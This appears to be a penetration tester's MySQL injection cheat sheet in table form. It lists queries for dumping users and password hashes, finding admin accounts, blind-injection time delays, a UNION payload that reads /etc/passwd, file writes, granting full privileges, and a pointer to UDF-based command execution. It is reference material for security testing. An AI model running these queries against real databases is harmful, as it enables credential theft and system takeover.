# MySQL Cheat Sheat
Author: pentestmonkey 

Some of the queries in the table below can only be run by an admin.  These are marked with “– priv” at the end of the query.
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT @@version</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1; #comment<br />
SELECT /*comment*/1;</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user();<br />
SELECT system_user();</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT user FROM mysql.user; &#8212; priv</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT host, user, password FROM mysql.user; &#8212; priv</td>
</tr>
<tr>
<td>Password Cracker</td>
<td><a href="http://www.openwall.com/john/">John the Ripper</a> will crack MySQL password hashes.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; &#8212; list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; &#8212; priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; &#8212; list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; &#8212; list privs on columns</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = &#8216;SUPER&#8217;;SELECT host, user FROM mysql.user WHERE Super_priv = &#8216;Y&#8217;; # priv</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT database()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT schema_name FROM information_schema.schemata; &#8212; for MySQL &gt;= v5.0<br />
SELECT distinct(db) FROM mysql.db &#8212; priv</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &#8216;mysql&#8217; AND table_schema != &#8216;information_schema&#8217;</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#8216;mysql&#8217; AND table_schema != &#8216;information_schema&#8217;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = &#8216;username&#8217;; &#8212; find table which have a column called &#8216;username&#8217;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0<br />
SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substr(&#8216;abcd&#8217;, 3, 1); # returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2; # returns 2<br />
SELECT 6 &amp; 1; # returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT char(65); # returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(&#8216;A&#8217;); # returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT cast(&#8217;1&#8242; AS unsigned integer);<br />
SELECT cast(&#8217;123&#8242; AS char);</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT CONCAT(&#8216;A&#8217;,'B&#8217;); #returns AB<br />
SELECT CONCAT(&#8216;A&#8217;,'B&#8217;,'C&#8217;); # returns ABC</td>
</tr>
<tr>
<td>If Statement</td>
<td>SELECT if(1=1,&#8217;foo&#8217;,'bar&#8217;); &#8212; returns &#8216;foo&#8217;</td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN (1=1) THEN &#8216;A&#8217; ELSE &#8216;B&#8217; END; # returns A</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT 0&#215;414243; # returns ABC</td>
</tr>
<tr>
<td>Time Delay</td>
<td><span>SELECT BENCHMARK(1000000,MD5(&#8216;A&#8217;));<br />
SELECT SLEEP(5); # &gt;= 5.0.12<br />
</span></td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>Impossible?</td>
</tr>
<tr>
<td>Command Execution</td>
<td>If mysqld (&lt;5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  <a href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">raptor_udf.c</a> explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.</td>
</tr>
<tr>
<td>Local File Access</td>
<td>&#8230;&#8217; UNION ALL SELECT LOAD_FILE(&#8216;/etc/passwd&#8217;) &#8212; priv, can only read world-readable files.<br />
SELECT * FROM mytable INTO dumpfile &#8216;/tmp/somefile&#8217;; &#8212; priv, write to file system</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT @@hostname;</td>
</tr>
<tr>
<td>Create Users</td>
<td>CREATE USER test1 IDENTIFIED BY &#8216;pass1&#8242;; &#8212; priv</td>
</tr>
<tr>
<td>Delete Users</td>
<td>DROP USER test1; &#8212; priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>GRANT ALL PRIVILEGES ON *.* TO test1@&#8217;%'; &#8212; priv</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>SELECT @@datadir;</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>information_schema (&gt;= mysql 5.0)<br />
mysql</td>
</tr>
</tbody>
</table>
<h3>Thanks</h3>
<p>Jonathan Turner for @@hostname tip.</p>
